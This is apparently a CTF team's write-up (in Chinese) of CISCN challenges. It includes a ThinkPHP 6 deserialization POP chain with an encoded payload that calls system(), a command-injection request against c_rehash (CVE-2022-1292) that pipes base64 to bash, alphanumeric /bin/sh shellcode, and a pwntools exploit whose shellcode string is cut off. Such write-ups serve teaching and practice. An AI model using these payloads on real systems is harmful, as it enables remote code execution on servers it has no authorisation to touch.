#CTF #CISCN #WP 
# MapleLeaves WriteUp
## 队员
[Do1phln](www.0error.net) [b477ery](https://blog.477.moe/) [sfc9982](https://googles.plus/) [0HB](https://harry0597.com/)
## Web

### Ezpop

thinkphp 6.0.12lts 存在反序列化漏洞 https://www.freebuf.com/vuls/321546.html  
扫描可知 www.zip 存在源码泄露，下载后可知存在反序列化路由 `/index.php/index/test`  
```php
<?php
namespace think{
    abstract class Model{
        private $lazySave = false;
        private $data = [];
        private $exists = false;
        protected $table;
        private $withAttr = [];
        protected $json = [];
        protected $jsonAssoc = false;
        function __construct($obj = ''){
            $this->lazySave = True;
            // $this->data = ['whoami' => ['ls /']];
            $this->data = ['whoami' => ['tac /flag.txt']];
            $this->exists = True;
            $this->table = $obj;
            $this->withAttr = ['whoami' => ['system']];
            $this->json = ['whoami',['whoami']];
            $this->jsonAssoc = True;
        }
    }
}
namespace think\model{
    use think\Model;
    class Pivot extends Model{
    }
}

namespace{
    echo(urlencode(serialize(new think\model\Pivot(new think\model\Pivot()))));
}
```

```htmlmixed
url: /index.php/index/test
post: a=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A13%3A%22tac+%2Fflag.txt%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A13%3A%22tac+%2Fflag.txt%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D
```

### online_crt

c_rehash 存在漏洞 https://www.secrss.com/articles/42602 CVE-2022-1292  
先通过 /getcrt 获取文件名  
再通过 /proxy 访问 go 服务更改文件名为命令  
最后通过 /createlink 调用 c_rehash 执行命令  

```
GET /proxy HTTP/1.1
Host: xxx:8888
Content-Length: 316
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://xxx:8888
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://xxx:8888/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: __jsluid_h=47deb9dd4ec6dca0063283f9453e7643
Connection: close

uri=/admin/%25%37%32%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%3foldname%3d24950c68-7018-4cd7-97c9-239cf4ecd3a7.crt%26newname%3d`touch%2b\`echo%2bY2F0IC9mKgo=|base64%2b-d|bash\``.crt HTTP/1.1
Host: admin
User-Agent: admin
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

```

## Crypto

### 电台签到

根据微信里公众号提示，找到密码本，进行模10运算，得到：

![签到](https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220529190529555.png)

也根据微信里提示，先用BurpSuit抓包发s,然后修改再发上面的数字，即：

- `GET /send?msg=sJ HTTP/1.1`

- `GET /send?msg=2975115315066710252297245914J HTTP/1.1`

依次发包，获得flag。

### 基于挑战码的双向认证

有终端term与服务器server，用户alice拟通过term登录server，alice与server共享密钥key。为防止重放攻击，term与server间拟采取基于挑战码的双向认证协议，其过程如下所述：

1. term生成随机数rA,并向server端发送。
2. server端生成随机数rB，计算MB=SM3(key, rA||rB),并向term发送rB 与MB。
3. term计算MB’= SM3(key, rA||rB),并与MB比较，若一致则确认服务器端正确。
4. term计算MA=SM3(key,rB),并将MA发送给Server
5. Server计算MA’=SM3(key,rB),并与MA比较,若一致则确认客户端登录正确。

客户端登录功能由user_client模块执行，服务器端登录功能由user_server模块执行。

完成user_client模块，并通过测试程序的验证。

使用 `find / -name "*flag*"`

可以找到位于 `/root/cube-shell/instance/flag_server` 下的：

```=
/root/cube-shell/instance/flag_server/flag2.txt
/root/cube-shell/instance/flag_server/flag1.txt
/root/cube-shell/instance/flag_server/flag.list
```

可得到flag

### 基于挑战码的双向认证2

审计了位于`src/login_user`的系统源码。

修改了位于login_user模块的proc_login_response函数，完伪装待发送的（USER_DEFINE,LOGIN）数据完成认证过程。

先使用`make`

再执行`login-challenge.sh`启动评测

以player用户身份登入系统。题目提供测试环境与评分环境。两环境中均各有：

- 服务实例 `cube-challenge/instance/server`
- 用户实例 `cube-challenge/instance/user`
- 非法服务器实例 `cube-challenge/instance/hacker_server`

当Login时，`hacker_server`在没有密钥的情况下试图冒充正常服务器端

### 基于挑战码的双向认证3

进入虚拟机后，发现名为的Instance

![](https://image.0error.net/img/202220220604142857.png)


注意到`passwd`用来存放认证相关数据（sm3计算结果），`nonce`则用来存放双方交换的随机数

使用覆盖率检查，各个声明中可能存在的缓冲区漏洞，以影响内存数据库，但未能成功利用。

最后，使用弱口令字典及模糊测试（**Fuzz Test**）

[https://github.com/google/AFL](https://github.com/google/AFL)

为了加速，应用补丁：

```bash=
diff --git a/sshd.c b/sshd.c
--- a/sshd.c
+++ b/sshd.c
@@ -1840,6 +1840,8 @@ main(int ac, char **av)
        /* ignore SIGPIPE */
        signal(SIGPIPE, SIG_IGN);
+       __AFL_INIT();
+
        /* Get a connection, either from inetd or a listening TCP socket */
        if (inetd_flag) {
                server_accept_inetd(&sock_in, &sock_out);
```

![](https://image.0error.net/img/202220220604142931.png)

发现弱口令后，获得root用户权限（Password:toor）

提权后即可访问`flag.txt`文件

## Pwn

### login-normal

下载到文件sign后拖入IDA进行具体分析
首先对main模块进行分析
```c++
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  char s[1032]; // [rsp+0h] [rbp-410h] BYREF
  unsigned __int64 v4; // [rsp+408h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  sub_C0A(a1, a2, a3);
  while ( 1 )
  {
    memset(s, 0, 0x400uLL);
    printf(">>> ");//输出提示符
    read(0, s, 0x3FFuLL);//读入数据s，定长
    sub_FFD(s);//调用函数
  }
}
```
可以看出在read字符串`s`后便执行`sub_FFD`，继续跟进分析`sub_FFD`
```c++
unsigned __int64 __fastcall sub_FFD(_BYTE *a1)
{
  char *sa; // [rsp+8h] [rbp-48h]
  char *sb; // [rsp+8h] [rbp-48h]
  char *sc; // [rsp+8h] [rbp-48h]
  char *sd; // [rsp+8h] [rbp-48h]
  char v7; // [rsp+17h] [rbp-39h]
  int v8; // [rsp+1Ch] [rbp-34h]
  int v9; // [rsp+2Ch] [rbp-24h]
  void *dest; // [rsp+30h] [rbp-20h]
  char *s1; // [rsp+38h] [rbp-18h]
  char *nptr; // [rsp+40h] [rbp-10h]
  unsigned __int64 v13; // [rsp+48h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  memset(qword_202040, 0, sizeof(qword_202040));
  v8 = 0;
  v7 = 0;
  dest = 0LL;
  while ( !*a1 || *a1 != 10 && (*a1 != 13 || a1[1] != 10) )// 关于a[0]和a[1]的判定关系
  {
    if ( v8 <= 5 )
      qword_202040[2 * v8] = a1;                // 处理的位分别是0，8，16，24，32
    sb = strchr(a1, 58);                        // 找到字符':'位置
    if ( !sb )
    {
      puts("error.");
      exit(1);
    }
    *sb = 0;                                    // 将找到':'的位置数值变为0
    for ( sc = sb + 1; *sc && (*sc == ' ' || *sc == '\r' || *sc == '\n' || *sc == '\t'); ++sc )// sc=sb的下一位，sc满足在范围内且等于指定字符
      *sc = 0;                                  // 当前字符置0
    if ( !*sc )             
    {
      puts("abort.");
      exit(2);
    }
    if ( v8 <= 5 )
      qword_202040[2 * v8 + 1] = sc;            // (0,8,16,24,32)+1出来的值
    sd = strchr(sc, '\n');                
    if ( !sd )
    {
      puts("error.");
      exit(3);
    }
    *sd = 0;                                    // 置零
    a1 = sd + 1;                                // 首位置到sd的下一位
    if ( *a1 == '\r' )                          // 如果当前位是\r下一位置0
      *a1++ = 0;
    s1 = (char *)qword_202040[2 * v8];          // 0,8,16,24,32
    nptr = (char *)qword_202040[2 * v8 + 1];  
    if ( !strcasecmp(s1, "opt") )         
    {
      if ( v7 )
      {                                         // 第一次opt退出
        puts("error.");
        exit(5);
      }
      v7 = atoi(nptr);
    }
    else
    {
      if ( strcasecmp(s1, "msg") )              // 是否是msg
      {
        puts("error.");
        exit(4);
      }
      if ( strlen(nptr) <= 1 )
      {
        puts("error.");
        exit(5);
      }
      v9 = strlen(nptr) - 1;             
      if ( dest )
      {
        puts("error.");
        exit(5);
      }
      dest = calloc(v9 + 8, 1uLL);
      if ( v9 <= 0 )
      {
        puts("error.");
        exit(5);
      }
      memcpy(dest, nptr, v9);                 
    }
    ++v8;
  }
  *a1 = 0;
  sa = a1 + 1;                              
  if ( *sa == '\n' )                            // 如果是换行符就赋值0
    *sa = 0;
  switch ( v7 )                           
  {
    case 2:
      sub_DA8((const char *)dest);
      break;
    case 3:
      sub_EFE((const char *)dest);
      break;
    case 1:
      sub_CBD((const char *)dest);
      break;
    default:
      puts("error.");
      exit(6);
  }
  return __readfsqword(0x28u) ^ v13;
}
```
由上述可知，要进行两次校验，在连接之后就需要先写通过校验才可以进行后续操作，即`'opt:1\r\nmsg:ro0t\r\n`和`opt:2\r\nmsg:`，且最终结尾必须是`\r\n`

绕过以后,进一步分析绕过之后执行的函数内容，`sub_DA8`函数内容如下
```c++
unsigned __int64 __fastcall sub_DA8(const char *a1)
{
  unsigned int v1; // eax
  size_t v2; // rax
  int i; // [rsp+14h] [rbp-2Ch]
  void *dest; // [rsp+18h] [rbp-28h]
  unsigned __int64 v6; // [rsp+28h] [rbp-18h]

  v6 = __readfsqword(0x28u);
  for ( i = 0; i < strlen(a1); ++i )
  {
    if ( !isprint(a1[i]) && a1[i] != 10 )
    {
      puts("oh!");
      exit(-1);
    }
  }
  if ( unk_202028 != 1 )
  {
    puts("oh!");
    exit(-1);
  }
  if ( unk_202024 )
  {
    v1 = getpagesize();
    dest = (void *)(int)mmap((char *)&loc_FFE + 2, v1, 7, 34, 0, 0LL);
    v2 = strlen(a1);
    memcpy(dest, a1, v2);
    ((void (*)(void))dest)();    //shellcode利用转换执行
  }
  else
  {
    puts(a1);
  }
  return __readfsqword(0x28u) ^ v6;
}
```
因此可见只需要填充对应数组执行shellcode即可，直接找到相应的执行`/bin/sh`的shellcode如下：
```
push edx
push 0x36363630
push esp
pop ecx
xor dword ptr ds:[ecx],esi
xor esi,dword ptr ds:[ecx]
pop eax
push 0x33333333
xor dword ptr ds:[ecx],esi
imul esi,dword ptr ds:[ecx],0x33
pop eax
push 0x69
push esi
xor dword ptr ds:[ecx],esi
dec eax
arpl word ptr ds:[ecx],si
pop edx
pop eax
pop ecx
xor word ptr ds:[ecx+esi*2+0x49],dx
dec eax
cmp word ptr ds:[ebx+0x44],bp
jno short tested.004780A6
xor byte ptr ds:[edx],dh
inc esp
jno short tested.004780AC
xor byte ptr ds:[ecx+esi+0x48],al
jnz short tested.0047808D
dec ebp
xor al,byte ptr ds:[edi+0x30]
pop edx
xor ch,byte ptr ds:[edi+0x34]
dec eax
xor byte ptr ss:[ebp+0x30],dh
push eax
xor dword ptr ds:[esi],esi
xor byte ptr ds:[edx+0x30],bl
aaa
dec edi
xor byte ptr ds:[edx+0x30],bl
inc ebx
xor dword ptr ds:[eax],esi
xor byte ptr ds:[ecx+0x35],bh
dec edi
xor eax,dword ptr ds:[edi+0x30]
xor dh,byte ptr ds:[eax]
inc edx
xor ch,byte ptr ds:[esi+0x30]
xor byte ptr ss:[esi+0x34],cl
jno short tested.004780B8
outs dx,byte ptr es:[edi]
xor dh,byte ptr ds:[eax+esi+0x42]
xor byte ptr ds:[eax],dh
xor byte ptr ds:[ecx],dh
xor byte ptr ds:[ecx],dh
xor byte ptr ds:[eax+0x33],cl
push ebx
xor bh,byte ptr ds:[ecx+0x30]
pop ecx
xor byte ptr ds:[edi+0x30],cl
outs dx,byte ptr es:[edi]
xor byte ptr ds:[edx+0x30],bh
xor dword ptr ds:[ebx],esi
xor al,0x30
xor al,byte ptr fs:[esi+0x34]
jns short tested.004780E4
push eax
xor dword ptr ds:[ecx],esi
xor eax,0x306E316C
dec edx
xor byte ptr ds:[eax+0x30],ch
popad
xor byte ptr ds:[edi],dh
xor byte ptr ds:[eax+eax],dh
add bh,bh
add byte ptr ds:[eax],al
add bh,bh

pop eax
inc ecx
```
然后即可写出最终的poc
```python
#!/usr/bin/env python
#coding=utf-8

from pwn import*

ip = ""
port = 
io = remote(ip,port)
libc = ELF('./libc-2.23.so')
io.recvuntil(">>>")
io.sendline('opt:1\r\nmsg:ro0t\r\n')    ##绕过1
shellcode = 'Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t
io.recvuntil(">>>")
io.sendline('opt:2\r\nmsg:'+shellcode+'\r\n')    #poc
io.interactive()
```
经过测试，成功进入交互模式，使用`cat flag`即可得到flag